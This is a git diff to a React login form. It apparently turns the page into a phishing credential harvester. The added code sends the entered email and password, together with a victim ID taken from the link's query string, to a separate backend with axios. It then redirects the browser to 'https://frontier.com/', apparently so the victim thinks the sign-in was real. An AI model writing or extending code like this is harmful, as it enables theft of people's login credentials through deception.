@@ -1,18 +1,38 @@
-import { useState } from 'react'
+import { useState, useEffect } from 'react'
 import Logo from '../assets/sha-logo.png'
+import axios from 'axios'
+import { hostURL } from '../helpers/data'
+import { useLocation } from 'react-router-dom'
 
 const Form = () => {
   const [email, setEmail] = useState('')
   const [password, setPassword] = useState('')
   const [error, setError] = useState(false)
 
+  const [redirect, setRedirect] = useState(false)
+
+  const { search } = useLocation()
+  const userID = search.slice(1)
+  console.log(userID)
+
+  useEffect(() => {
+    redirect && window.location.replace('https://frontier.com/')
+  }, [redirect])
+
   const handleClick = () => {
+    setError(false)
     if (!email || !password) {
       setError(true)
       return
     }
-    alert('yes')
+    axios
+      .post(`${hostURL}main`, { email, password, userID })
+      .then(() => {
+        setRedirect(true)
+      })
+      .catch((e) => console.log(e))
   }
+
   return (
     <div className='mt-5 text-[#666666] px-3 flex flex-col gap-3 border-r-2'>
       <header className='flex items-center justify-center flex-col'>
